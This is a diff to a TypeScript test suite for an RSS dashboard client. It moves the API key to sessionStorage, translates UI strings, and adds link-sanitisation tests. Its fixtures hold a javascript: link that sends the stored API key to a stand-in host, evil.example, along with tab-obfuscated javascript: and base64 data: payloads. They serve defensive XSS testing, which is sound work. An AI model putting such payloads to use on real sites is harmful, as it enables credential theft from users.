@@ -77,15 +77,18 @@ function createMockFetch(responses: MockResponse[]) {
       status: next.status ?? 200,
       statusText: next.statusText ?? 'OK',
       headers: {
-        get: (name: string) => (name.toLowerCase() === 'content-type' ? next.contentType ?? 'application/json' : null),
+        get: (name: string) =>
+          name.toLowerCase() === 'content-type' ? (next.contentType ?? 'application/json') : null,
       },
       json: async () => next.body,
-      text: async () => String(next.body),
+      // `body` is either a raw string fixture or an object. A real Response
+      // serialises the object; `String(...)` would hand back '[object Object]'.
+      text: async () => (typeof next.body === 'string' ? next.body : JSON.stringify(next.body)),
     };
   });
 }
 
-function createHarness(responses: MockResponse[]) {
+function createHarness(responses: MockResponse[], seedLocalStorage: Record<string, string> = {}) {
   const ids = [
     'api-key',
     'save-key',
@@ -187,14 +190,19 @@ function createHarness(responses: MockResponse[]) {
   const elements = new Map<string, FakeElement>(ids.map((id) => [id, new FakeElement()]));
   const fetch = createMockFetch(responses);
   const storage = new Map<string, string>();
+  const legacyStorage = new Map<string, string>(Object.entries(seedLocalStorage));
+
+  const createStorage = (backing: Map<string, string>) => ({
+    getItem: (key: string) => backing.get(key) ?? null,
+    setItem: (key: string, value: string) => backing.set(key, value),
+    removeItem: (key: string) => backing.delete(key),
+  });
 
   const context = vm.createContext({
     fetch,
     URLSearchParams,
-    localStorage: {
-      getItem: (key: string) => storage.get(key) ?? null,
-      setItem: (key: string, value: string) => storage.set(key, value),
-    },
+    localStorage: createStorage(legacyStorage),
+    sessionStorage: createStorage(storage),
     document: {
       getElementById: (id: string) => {
         const element = elements.get(id);
@@ -208,10 +216,12 @@ function createHarness(responses: MockResponse[]) {
     console,
   });
 
+  // `globalThis` inside a vm context resolves to the context object itself, so the
+  // storage stubs above are reachable through the same accessor the browser uses.
   const script = readFileSync(join(process.cwd(), 'public', 'dashboard', 'app.js'), 'utf8');
   vm.runInContext(script, context);
 
-  return { elements, fetch, storage };
+  return { elements, fetch, storage, legacyStorage, context };
 }
 
 async function flush() {
@@ -222,7 +232,9 @@ async function flush() {
 
 function fullRefreshResponses(): MockResponse[] {
   return [
-    { body: { data: { feedsTotal: 10, feedsActive: 9, feedsError: 1, entries24h: 4, entries7d: 12, alertsPending: 2 } } },
+    {
+      body: { data: { feedsTotal: 10, feedsActive: 9, feedsError: 1, entries24h: 4, entries7d: 12, alertsPending: 2 } },
+    },
     { body: { status: 'ok' } },
     { body: { status: 'ok' } },
     { body: { data: [], meta: { total: 0, page: 1, has_next: false } } },
@@ -260,21 +272,33 @@ describe('dashboard client', () => {
     await flush();
 
     expect(harness.storage.get('rss-dashboard-api-key')).toBe('ak_test');
+    expect(harness.legacyStorage.has('rss-dashboard-api-key')).toBe(false);
     expect(harness.fetch).toHaveBeenCalledTimes(7);
 
     const firstCall = harness.fetch.mock.calls[0];
     const options = firstCall?.[1] as { headers: Record<string, string> };
     expect(options.headers.Authorization).toBe('Bearer ak_test');
     expect(options.headers['x-api-key']).toBe('ak_test');
-    expect(feedback.textContent).toContain('Datos actualizados');
+    expect(feedback.textContent).toContain('Data updated');
   });
 
   it('creates a feed from dashboard form', async () => {
     const responses = [
       ...fullRefreshResponses(),
       { body: { data: { id: 123, status: 'active' } } },
-      { body: { data: [{ id: 123, url: 'https://example.com/rss.xml', status: 'active', nextCheckAt: '2026-03-31T00:00:00.000Z' }], meta: { total: 1, page: 1, has_next: false } } },
-      { body: { data: { feedsTotal: 11, feedsActive: 10, feedsError: 1, entries24h: 4, entries7d: 12, alertsPending: 2 } } },
+      {
+        body: {
+          data: [
+            { id: 123, url: 'https://example.com/rss.xml', status: 'active', nextCheckAt: '2026-03-31T00:00:00.000Z' },
+          ],
+          meta: { total: 1, page: 1, has_next: false },
+        },
+      },
+      {
+        body: {
+          data: { feedsTotal: 11, feedsActive: 10, feedsError: 1, entries24h: 4, entries7d: 12, alertsPending: 2 },
+        },
+      },
       { body: { status: 'ok' } },
       { body: { status: 'ok' } },
     ];
@@ -398,7 +422,7 @@ describe('dashboard client', () => {
     expect(settingsRecipientEmails.value).toBe('old@example.com');
     expect(settingsTelegramChatIds.value).toBe('-10010');
     expect(settingsTelegramMode.value).toBe('instant');
-    expect(settingsTelegramTokenStatus.textContent).toContain('configurado');
+    expect(settingsTelegramTokenStatus.textContent).toContain('configured');
 
     settingsInput.value = 'https://hooks.example.com/new';
     settingsRecipientEmails.value = 'alerts@example.com, OPS@example.com\nalerts@example.com';
@@ -461,7 +485,14 @@ describe('dashboard client', () => {
     const settingsForm = harness.elements.get('settings-form');
     const settingsTelegramToken = harness.elements.get('settings-telegram-bot-token');
     const settingsTelegramTokenClear = harness.elements.get('settings-telegram-token-clear');
-    if (!apiKey || !saveKey || !settingsRefresh || !settingsForm || !settingsTelegramToken || !settingsTelegramTokenClear) {
+    if (
+      !apiKey ||
+      !saveKey ||
+      !settingsRefresh ||
+      !settingsForm ||
+      !settingsTelegramToken ||
+      !settingsTelegramTokenClear
+    ) {
       throw new Error('missing element');
     }
 
@@ -491,5 +522,102 @@ describe('dashboard client', () => {
 
     const putOptions = putCall?.[1] as { body: string };
     expect(JSON.parse(putOptions.body)).toMatchObject({ telegram_bot_token_clear: true });
+  });
+
+  it('renders hostile javascript: entry links as an inert href', async () => {
+    const responses = fullRefreshResponses();
+    responses[3] = {
+      body: {
+        data: [
+          {
+            id: 1,
+            title: 'Hostile entry',
+            feedId: 7,
+            publishedAt: '2026-03-31T00:00:00.000Z',
+            link: "javascript:fetch('//evil.example/'+sessionStorage.getItem('rss-dashboard-api-key'))",
+          },
+          {
+            id: 2,
+            title: 'Safe entry',
+            feedId: 7,
+            publishedAt: '2026-03-31T00:00:00.000Z',
+            link: 'https://example.com/article',
+          },
+        ],
+        meta: { total: 2, page: 1, has_next: false },
+      },
+    };
+
+    const harness = createHarness(responses);
+    const apiKey = harness.elements.get('api-key');
+    const saveKey = harness.elements.get('save-key');
+    const entriesBody = harness.elements.get('entries-body');
+    if (!apiKey || !saveKey || !entriesBody) throw new Error('missing element');
+
+    await flush();
+    apiKey.value = 'ak_test';
+    const click = saveKey.listeners.get('click');
+    if (!click) throw new Error('click listener missing');
+    await click();
+    await flush();
+
+    expect(entriesBody.innerHTML).toContain('href="#"');
+    expect(entriesBody.innerHTML).not.toContain('javascript:');
+    expect(entriesBody.innerHTML).toContain('href="https://example.com/article"');
+  });
+
+  it('rejects scheme-obfuscated links and keeps http feed urls clickable', async () => {
+    const responses = fullRefreshResponses();
+    responses[4] = {
+      body: {
+        data: [
+          { id: 1, url: 'java\tscript:alert(1)', status: 'active', nextCheckAt: '2026-03-31T00:00:00.000Z' },
+          {
+            id: 2,
+            url: 'data:text/html;base64,PHNjcmlwdD4=',
+            status: 'active',
+            nextCheckAt: '2026-03-31T00:00:00.000Z',
+          },
+          { id: 3, url: 'http://example.com/rss.xml', status: 'active', nextCheckAt: '2026-03-31T00:00:00.000Z' },
+        ],
+        meta: { total: 3, page: 1, has_next: false },
+      },
+    };
+
+    const harness = createHarness(responses);
+    const apiKey = harness.elements.get('api-key');
+    const saveKey = harness.elements.get('save-key');
+    const feedsBody = harness.elements.get('feeds-body');
+    if (!apiKey || !saveKey || !feedsBody) throw new Error('missing element');
+
+    await flush();
+    apiKey.value = 'ak_test';
+    const click = saveKey.listeners.get('click');
+    if (!click) throw new Error('click listener missing');
+    await click();
+    await flush();
+
+    const inertHrefs = feedsBody.innerHTML.match(/href="#"/g) ?? [];
+    expect(inertHrefs).toHaveLength(2);
+    expect(feedsBody.innerHTML).toContain('href="http://example.com/rss.xml"');
+    expect(feedsBody.innerHTML).not.toContain('href="data:');
+    expect(feedsBody.innerHTML).not.toContain('href="java');
+  });
+
+  it('keeps the API key out of localStorage and migrates any legacy value', async () => {
+    const harness = createHarness(fullRefreshResponses(), { 'rss-dashboard-api-key': 'ak_legacy' });
+    const authMode = harness.elements.get('auth-mode');
+    const apiKeyInput = harness.elements.get('api-key');
+    if (!authMode || !apiKeyInput) throw new Error('missing element');
+
+    await flush();
+
+    expect(harness.legacyStorage.has('rss-dashboard-api-key')).toBe(false);
+    expect(harness.storage.get('rss-dashboard-api-key')).toBe('ak_legacy');
+    expect(apiKeyInput.value).toBe('ak_legacy');
+
+    const firstCall = harness.fetch.mock.calls[0];
+    const options = firstCall?.[1] as { headers: Record<string, string> };
+    expect(options.headers.Authorization).toBe('Bearer ak_legacy');
   });
 });
